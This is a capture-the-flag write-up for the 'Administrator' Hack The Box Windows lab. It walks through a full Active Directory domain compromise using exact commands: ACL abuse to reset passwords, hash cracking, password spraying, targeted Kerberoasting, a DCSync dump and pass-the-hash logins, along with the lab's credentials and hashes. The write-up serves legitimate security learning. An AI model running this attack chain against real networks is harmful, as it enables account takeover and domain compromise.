
## About
`Administrator` is a medium-difficulty Windows machine designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3` file is discovered, cracked, and reveals credentials for several users. These credentials are sprayed across the domain, revealing valid credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

## Initial creds
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: 
```
Username: Olivia 
Password: ichliebedich
```
## Nmap

```
nmap -sV -sC -p- -v -T5 10.129.51.221
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 02:13:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50584/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50585/tcp open  msrpc         Microsoft Windows RPC
50590/tcp open  msrpc         Microsoft Windows RPC
50593/tcp open  msrpc         Microsoft Windows RPC
50617/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 37m38s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-31T02:14:19
|_  start_date: N/A
```
## bloodhound enum

Run collector
```
bloodhound-python -u Olivia -p ichliebedich -d administrator.htb -ns 10.129.51.221 -c All
```

![](pics/Pasted%20image%2020260830222124.png)

## From olivia to Michael

Using `certipy` to perfom shadow attack
```
certipy shadow auto -u Olivia -p ichliebedich -account michael -dc-ip 10.129.51.221
```

![](pics/Pasted%20image%2020260830222611.png)

Fix ssl wrapper error
```
certipy shadow auto \
    -u Olivia \
    -p ichliebedich \
    -account michael \
    -dc-ip 10.129.51.221 \
    -ldap-scheme ldap \
    -no-ldap-channel-binding \
    -no-ldap-signing
```

Still there is a error there is no NT hash collected
![](pics/Pasted%20image%2020260830222754.png)

Another approach
```
bloodyAD -i 10.129.51.221 -u Olivia -p ichliebedich set password michael 'Summer@123!'
```
![](pics/Pasted%20image%2020260830223259.png)

New creds
```
michael 
Summer@123!
```

## From michael to benjamin

![](pics/Pasted%20image%2020260830223545.png)

Same here
```
bloodyAD -i 10.129.51.221 -u michael -p 'Summer@123!' set password BENJAMIN 'Summer@123!'
```

![](pics/Pasted%20image%2020260830223538.png)

New creds
```
benjamin
Summer@123!
```
## Benjamin groups

![](pics/Pasted%20image%2020260830223714.png)

## FTP access

Via `olivia` I can not.
![](pics/Pasted%20image%2020260830225801.png)

Using the creds of `binjamin`:
```
ftp benjamin@10.129.51.221
```

![](pics/Pasted%20image%2020260830225949.png)

## psafe 3
it is encrypted DB used by `password safe` to safely store passwords
![](pics/Pasted%20image%2020260830230249.png)


## Crack it with hascat

```
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

![](pics/Pasted%20image%2020260830230553.png)

Cracked !
```
Backup.psafe3:tekieromucho
```
## password safe

Download it
```
sudo apt install passwordsafe
```

Open the encrypted DB and type the cracked password
![](pics/Pasted%20image%2020260830231653.png)

Extract the passwords of these users
![](pics/Pasted%20image%2020260830231912.png)

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```
## Trying these creds

```
nxc smb 10.129.51.221 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
nxc smb 10.129.51.221 -u emma -p WwANQWnmJnGV07WQN8bMS7FMAbjNur
nxc smb 10.129.51.221 -u alexander -p UrkIbagoxMyUGw0aPlj9B0AXSea4Sw    
```

![](pics/Pasted%20image%2020260830232333.png)

Valid creds
```
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
## Flag 1

```
evil-winrm -i 10.129.51.221 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb  
```

![](pics/Pasted%20image%2020260830232601.png)
## PrivEsc

Since Ethan user have these privileges `GetChanges` and `GetChangesAll`. He can perform a `DCSync` attack.

Here is the `GetChangesAll` priv
![](pics/Pasted%20image%2020260830233528.png)

Here is the `GetChanges` priv
![](pics/Pasted%20image%2020260830233740.png)
### From Emily to Ethan

![](pics/Pasted%20image%2020260830234200.png)

```
certipy shadow auto -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -account ethan -dc-ip 10.129.51.221 -ldap-scheme ldap
```
Failed with error `KDC_ERR_PADATA_TYPE_NOSUPP`

![](pics/Pasted%20image%2020260830234632.png)

So I tried another approach which is dump the krb5 hash of ethan than crack it.
```
targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

![](pics/Pasted%20image%2020260830235432.png)

Crack it via hashcat
![](pics/Pasted%20image%2020260830235509.png)

New creds
```
ethan:limpbizkit
```

Now lets perform the DCsync attack using ethan allowing us to dump the NT hash of the `administrator`

```
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
```
![](pics/Pasted%20image%2020260831000040.png)

Administrator NT hash
```
3dc553ce4b9fd20bd016e098d2d2fd2e
```
## Flag 2

```
evil-winrm -i 10.129.51.221 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```

![](pics/Pasted%20image%2020260831000153.png)

Done.

![](pics/Pasted%20image%2020260831000214.png)


